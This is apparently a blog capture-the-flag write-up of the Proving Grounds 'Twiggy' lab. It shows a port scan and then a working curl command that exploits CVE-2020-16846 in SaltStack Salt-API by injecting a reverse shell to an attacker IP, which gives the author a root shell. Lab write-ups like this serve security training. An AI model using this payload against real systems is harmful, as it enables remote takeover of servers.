---
title: "PG Practice - Twiggy"
date: 2026-04-04
draft: false
tags: ["Proving Grounds Practice", "Linux", "Write-Up"]
cover:
    image: "/images/writeup_screens/pg_twiggy/twiggy_cover.svg"      
    alt: "HTB CCTV Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| Difficulty | Easy |
| Type | Linux |

**Port Scan**
```
└─$ nmap -sV -p- 192.168.208.62
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 20:40 +0200
Nmap scan report for 192.168.208.62
Host is up (0.032s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.61 seconds

```

## Proof

As we can see in the port scan above, there are two web servers running on the target. On port **80** there is a _Mezzanine_ Instance which doesn't seem to be exploitable. On the other hand, the webserver on Port **8000** is running a **Saltstack-Salt-API** as can be seen in the _X-Upstream_ Header in the HTTP-Response: 

![](/images/writeup_screens/pg_twiggy/pg_twiggy1.png)

The service is vulnerable to **CVE-2020-16846** which allows us to execute arbitrary commands on the target server. There is a [public exploit](https://github.com/zomy22/CVE-2020-16846-Saltstack-Salt-API) available which i modified to the following command:

```
curl -i 192.168.208.62:8000/run -H "Content-type: application/json" -d '{"client":"ssh","tgt":"A","fun":"B","eauth":"C","ssh_priv":"|/bin/sh -i >& /dev/tcp/192.168.45.155/80 0>&1 #"}' 
```

I then started a **netcat** listener on port **80** on my attacker machine and ran the command. Shortly after i received a root shell and was able to read the flag `/root/proof.txt` on the target machine:

![](/images/writeup_screens/pg_twiggy/pg_twiggy2.png)

 





